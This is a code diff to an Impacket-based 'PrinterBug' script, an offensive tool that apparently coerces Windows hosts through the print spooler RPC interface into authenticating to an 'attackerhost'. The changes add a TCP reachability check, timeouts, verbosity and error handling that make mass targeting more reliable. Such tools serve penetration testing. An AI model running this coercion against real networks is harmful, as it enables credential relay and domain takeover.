@@ -37,6 +37,7 @@ from impacket.examples.logger import ImpacketFormatter
 from impacket import version
 from impacket.dcerpc.v5 import transport, rprn
 from impacket.dcerpc.v5.dtypes import NULL
+import socket
 
 class PrinterBug(object):
     KNOWN_PROTOCOLS = {
@@ -45,7 +46,7 @@ class PrinterBug(object):
         }
 
     def __init__(self, username='', password='', domain='', port=None,
-                 hashes=None, attackerhost=''):
+                 hashes=None, attackerhost='', ping=True, timeout=1):
 
         self.__username = username
         self.__password = password
@@ -54,6 +55,8 @@ class PrinterBug(object):
         self.__lmhash = ''
         self.__nthash = ''
         self.__attackerhost = attackerhost
+        self.__tcp_ping = ping
+        self.__tcp_timeout = timeout
         if hashes is not None:
             self.__lmhash, self.__nthash = hashes.split(':')
 
@@ -79,12 +82,34 @@ class PrinterBug(object):
             if logging.getLogger().level == logging.DEBUG:
                 import traceback
                 traceback.print_exc()
+            logging.critical("An unhandled exception has occured. Please open up an issue! Continueing...")
             logging.critical(str(e))
+
+    def ping(self, host):
+        # Code stolen from https://github.com/fox-it/BloodHound.py/blob/1124a1b5c6f62fa6c058f7294251c7cb223e3d66/bloodhound/ad/utils.py#L126 and slightly modified by @tacticalDevC
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(self.__tcp_timeout)
+            s.connect((host, self.__port))
+            s.close()
+            return True
+        except KeyboardInterrupt:
             raise
+        except:
+            return False
 
     def lookup(self, rpctransport, host):
+        if self.__tcp_ping and self.ping(host) is False:
+            logging.info("Host is offline. Skipping!")
+            return
+        
         dce = rpctransport.get_dce_rpc()
-        dce.connect()
+        try:
+            dce.connect()
+        except Exception as e:
+            # Probably this isn't a Windows machine or SMB is closed
+            logging.error("Timeout - Skipping host!")
+            return
         dce.bind(rprn.MSRPC_UUID_RPRN)
         logging.info('Bind OK')
         try:
@@ -137,6 +162,7 @@ def main():
 
     parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
     parser.add_argument('attackerhost', action='store', help='hostname to connect to')
+    parser.add_argument("--verbose", action="store_true", help="Switch verbosity to DEBUG")
 
     group = parser.add_argument_group('connection')
 
@@ -147,6 +173,15 @@ def main():
                             ' the command line (you must still specify something as target name)')
     group.add_argument('-port', choices=['139', '445'], nargs='?', default='445', metavar="destination port",
                        help='Destination port to connect to SMB Server')
+    group.add_argument("-timeout",
+                        action="store",
+                        metavar="timeout",
+                        default=1,
+                        help="Specify a timeout for the TCP ping check")
+    group.add_argument("-no-ping",
+                        action="store_false",
+                        help="Specify if a TCP ping should be done before connection"\
+                            "NOT recommended since SMB timeouts default to 300 secs and the TCP ping assures connectivity to the SMB port")
 
     group = parser.add_argument_group('authentication')
 
@@ -169,6 +204,9 @@ def main():
         password = password + '@' + remote_name.rpartition('@')[0]
         remote_name = remote_name.rpartition('@')[2]
 
+    if options.verbose:
+        logging.getLogger().setLevel(logging.DEBUG)
+
     if domain is None:
         domain = ''
 
@@ -184,14 +222,13 @@ def main():
     else:
         remote_names.append(remote_name)
 
-    lookup = PrinterBug(username, password, domain, int(options.port), options.hashes, options.attackerhost)
+    lookup = PrinterBug(username, password, domain, int(options.port), options.hashes, options.attackerhost, options.no_ping, float(options.timeout))
     for remote_name in remote_names:
 
         try:
             lookup.dump(remote_name)
         except KeyboardInterrupt:
             break
-        # except:
 
 
 if __name__ == '__main__':
